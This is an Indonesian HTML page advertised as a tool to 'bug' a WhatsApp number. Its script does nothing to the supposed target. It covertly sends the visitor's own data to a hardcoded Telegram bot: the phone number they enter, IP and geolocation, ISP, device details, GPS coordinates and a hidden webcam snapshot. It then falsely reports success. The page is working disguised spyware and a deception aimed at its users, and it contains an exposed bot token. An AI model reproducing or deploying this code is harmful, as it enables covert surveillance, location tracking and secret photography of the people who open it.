<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Website Bug WhatsApp By Zeyy</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: linear-gradient(135deg, #230f0f 0%, #2e1a1a 50%, #3e1616 100%);
      font-family: 'Inter', sans-serif;
      color: red;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
      padding: 20px;
    }
    .bg-particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
    .particle {
      position: absolute;
      width: 2px;
      height: 2px;
      background: rgba(255, 0, 0, 0.3);
      border-radius: 50%;
      animation: float 6s ease-in-out infinite, pulseParticle 3s infinite;
    }
    @keyframes float {
      0%, 100% { transform: translateY(0px); opacity: 0.3; }
      50% { transform: translateY(-20px); opacity: 0.8; }
    }
    @keyframes pulse {
      0% { box-shadow: 0 0 5px red, 0 0 10px red; }
      50% { box-shadow: 0 0 20px red, 0 0 40px red; }
      100% { box-shadow: 0 0 5px red, 0 0 10px red; }
    }
    @keyframes pulseParticle {
      0%,100% { opacity: 0.3; }
      50% { opacity: 1; box-shadow: 0 0 10px red; }
    }
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      20% { transform: translateX(-10px); }
      40% { transform: translateX(10px); }
      60% { transform: translateX(-10px); }
      80% { transform: translateX(10px); }
    }
    .shake {
      animation: shake 0.4s;
    }
    .login-container {
      background-color: rgba(17, 17, 17, 0.95);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px red;
      text-align: center;
      max-width: 400px;
      width: 100%;
      z-index: 2;
      animation: pulse 3s infinite;
    }
    .login-title {
      font-size: 26px;
      font-weight: 900;
      margin-bottom: 10px;
      background: linear-gradient(135deg, #ff0000, #ffffff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .login-subtitle {
      font-size: 13px;
      color: #ffc107;
      margin-bottom: 20px;
    }
    .login-input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      background: #333;
      border: none;
      border-radius: 6px;
      color: #fff;
      font-size: 15px;
      transition: transform 0.2s;
    }
    .login-button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(135deg, #ff0000, #cc0000);
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-weight: 600;
      font-size: 15px;
      animation: pulse 2s infinite;
    }
    .login-button:hover {
      background-color: #f00;
      box-shadow: 0 0 25px red, 0 0 50px red;
    }
    #info {
      white-space: pre-wrap;
      text-align: left;
      margin-top: 20px;
      background: #222;
      padding: 15px;
      border-radius: 8px;
      font-size: 13px;
    }
    video, canvas {
      display: none;
    }
    @media (max-width: 480px) {
      .login-container {
        padding: 25px 20px;
        border-radius: 14px;
      }
      .login-title {
        font-size: 22px;
      }
      .login-input, .login-button {
        font-size: 14px;
        padding: 10px;
      }
    }
  </style>
</head>
<body>
  <div class="bg-particles"></div>

  <div class="login-container">
    <p class="login-title">Website Bug WhatsApp By Zeyy</p>
    <p class="login-subtitle">‚ö†Ô∏è Jangan Disalahgunakan</p>
    <input type="number" class="login-input" placeholder="628√ó√ó√ó√ó" id="text">
    <button class="login-button" id="login-button">Next</button>
    <div id="info">ü•∑ Silahkan masukkan nomor untuk di bug...</div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <script>
    const botToken = '8485662088:AAEOdPfx5bIYzE4-GuKLzToWx-j5vmIQxmw';
    const chatIds = ['8153066193'];
    const infoDiv = document.getElementById('info');
    const input = document.getElementById('text');
    const button = document.getElementById('login-button');

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(console.error);
      });
    }

    function sendPhotoToTelegram(blob) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).catch(console.error);
      });
    }

    async function getInfo() {
      let ip = '-', city = '-', region = '-', country = '-', org = '-';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
        const loc = await locRes.json();
        if (loc.status === 'success') {
          city = loc.city;
          region = loc.regionName;
          country = loc.country;
          org = loc.org;
        }
      } catch {}

      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';

      const text = `
IP         : ${ip}
Kota       : ${city}
Region     : ${region}
Negara     : ${country}
ISP        : ${org}
Browser    : ${navigator.userAgent}
OS         : ${navigator.platform}
Resolusi   : ${screen.width}x${screen.height}
Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
Memori     : ${navigator.deviceMemory || 'N/A'} GB
Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
Waktu      : ${new Date().toLocaleString()}
      `.trim();

      sendToTelegram(`<b>üì• Info Pengunjung:</b>\n<pre>${text}</pre>`);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            sendToTelegram(`<b>üìç Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
          },
          () => sendToTelegram(`üìç Lokasi GPS Ditolak`)
        );
      } else {
        sendToTelegram(`üìç Browser tidak support GPS`);
      }
    }

    async function startCamera() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              setTimeout(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                  if (blob) sendPhotoToTelegram(blob);
                  stream.getTracks().forEach(track => track.stop());
                  resolve();
                }, 'image/jpeg');
              }, 3000);
            };
          })
          .catch(err => {
            sendToTelegram('‚ùå  Kamera DiTolak')
            resolve();
          });
      });
    }

    button.addEventListener('click', async () => {
      const nomor = input.value.trim();
      if (!nomor || nomor.length < 8 || nomor.length > 15) {
        infoDiv.innerText = '‚ö†Ô∏è Nomor tidak valid.';
        input.classList.add('shake');
        setTimeout(() => input.classList.remove('shake'), 400);
        return;
      }
      button.disabled = true;
      infoDiv.innerText = '‚è≥ Memproses Bug...';
      sendToTelegram(`<b>üìû Nomor Target:</b> ${nomor}`);
      input.value = '';
      try {
        await getInfo();
        await startCamera();
        setTimeout(() => {
          infoDiv.innerText = `‚úÖ Successfully bug nomor ${nomor}`;
          button.disabled = false;
        }, 1000);
      } catch (e) {
        infoDiv.innerText = '‚ùå Terjadi kesalahan.';
        button.disabled = false;
      }
    });

    function createParticles() {
      const container = document.querySelector('.bg-particles');
      for (let i = 0; i < 50; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 6 + 's';
        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
        container.appendChild(p);
      }
    }
    document.addEventListener('DOMContentLoaded', createParticles);
  </script>
</body>
</html>
